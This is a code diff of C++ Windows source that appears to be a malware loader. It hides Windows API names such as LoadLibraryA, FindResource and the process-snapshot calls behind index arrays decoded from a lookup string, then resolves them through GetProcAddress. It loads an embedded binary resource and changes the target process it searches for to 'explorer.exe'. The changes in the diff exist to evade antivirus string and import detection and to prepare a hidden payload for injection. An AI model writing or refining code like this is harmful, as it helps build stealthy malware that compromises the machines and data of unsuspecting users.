@@ -24,27 +24,27 @@ void loadkumres(const char* rssssame, char** data, DWORD* size) {
     int loa_res[] = {37, 14, 0, 3, 43, 4, 18, 14, 20, 17, 2, 4};
     int loc_res[] = {37, 14, 2, 10, 43, 4, 18, 14, 20, 17, 2, 4};
     int siz_res[] = {44, 8, 25, 4, 14, 5, 43, 4, 18, 14, 20, 17, 2, 4};
-    //HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
-    //auto pGetModuleHandle = (HMODULE(WINAPI*)(LPCSTR))GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_mod_han, big_string, sizeof(get_mod_han)).c_str());
-    //auto pFindResource = (HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))GetProcAddress(istfromKe__ws_ls_32, getoriginal(fin_res, big_string, sizeof(fin_res)).c_str());
-    //FARPROC pLoadResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loa_res, big_string, sizeof(loa_res)).c_str());
-    //auto pLockResource = (char*(WINAPI*)(HGLOBAL))GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str());
-    //FARPROC pSizeofResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(siz_res, big_string, sizeof(siz_res)).c_str());
+    HMODULE istfromKe__ws_ls_32 = LoadLibraryA(getoriginal(ws_lld_ker_32, big_string, sizeof(ws_lld_ker_32)).c_str());
+    auto pGetModuleHandle = (HMODULE(WINAPI*)(LPCSTR))GetProcAddress(istfromKe__ws_ls_32, getoriginal(get_mod_han, big_string, sizeof(get_mod_han)).c_str());
+    auto pFindResource = (HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))GetProcAddress(istfromKe__ws_ls_32, getoriginal(fin_res, big_string, sizeof(fin_res)).c_str());
+    FARPROC pLoadResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(loa_res, big_string, sizeof(loa_res)).c_str());
+    auto pLockResource = (char*(WINAPI*)(HGLOBAL))GetProcAddress(istfromKe__ws_ls_32, getoriginal(loc_res, big_string, sizeof(loc_res)).c_str());
+    FARPROC pSizeofResource = GetProcAddress(istfromKe__ws_ls_32, getoriginal(siz_res, big_string, sizeof(siz_res)).c_str());
     
-    //HMODULE hModule = ((HMODULE(WINAPI*)(LPCSTR))pGetModuleHandle)(NULL);
-    //HRSRC hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFindResource)(hModule, rssssame, RT_RCDATA);
+    HMODULE hModule = ((HMODULE(WINAPI*)(LPCSTR))pGetModuleHandle)(NULL);
+    HRSRC hResource = ((HRSRC(WINAPI*)(HMODULE, LPCSTR, LPCSTR))pFindResource)(hModule, rssssame, RT_RCDATA);
 
-    //HGLOBAL hResData = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoadResource)(hModule, hResource);
-    //*size = ((DWORD(WINAPI*)(HMODULE, HRSRC))pSizeofResource)(hModule, hResource);
-    //*data = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(hResData);
+    HGLOBAL hResData = ((HGLOBAL(WINAPI*)(HMODULE, HRSRC))pLoadResource)(hModule, hResource);
+    *size = ((DWORD(WINAPI*)(HMODULE, HRSRC))pSizeofResource)(hModule, hResource);
+    *data = (char*)((char*(WINAPI*)(HGLOBAL))pLockResource)(hResData);
 
 
-    HMODULE hModule = GetModuleHandle(NULL);
-    HRSRC hResource = FindResource(hModule, rssssame, RT_RCDATA);
+    //HMODULE hModule = GetModuleHandle(NULL);
+    //HRSRC hResource = FindResource(hModule, rssssame, RT_RCDATA);
 
-    HGLOBAL hResData = LoadResource(hModule, hResource);
-    *size = SizeofResource(hModule, hResource);
-    *data = (char*)LockResource(hResData);
+    //HGLOBAL hResData = LoadResource(hModule, hResource);
+    //*size = SizeofResource(hModule, hResource);
+    //*data = (char*)LockResource(hResData);
 }
 
 int main() {
@@ -68,8 +68,8 @@ int main() {
     FARPROC pcreate_snap = GetProcAddress(istfromKe__ws_ls_32, getoriginal(create_snap, big_string, sizeof(create_snap)).c_str());
     HANDLE snapshot = ((HANDLE(WINAPI*)(DWORD, DWORD))pcreate_snap)(TH32CS_SNAPPROCESS, 0);
 
-    int run_timeb[] = {43, 20, 13, 19, 8, 12, 4, 27, 17, 14, 10, 4, 17, 62, 4, 23, 4};
-    const char *procmantar = getoriginal(run_timeb, big_string, sizeof(run_timeb)).c_str();
+    int exple[] = {4, 23, 15, 11, 14, 17, 4, 17, 62, 4, 23, 4};
+    const char *procmantar = getoriginal(exple, big_string, sizeof(exple)).c_str();
 
     int proc_firs[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 31, 8, 17, 18, 19};
     int proc_Nex[] = {41, 17, 14, 2, 4, 18, 18, 55, 54, 39, 4, 23, 19};
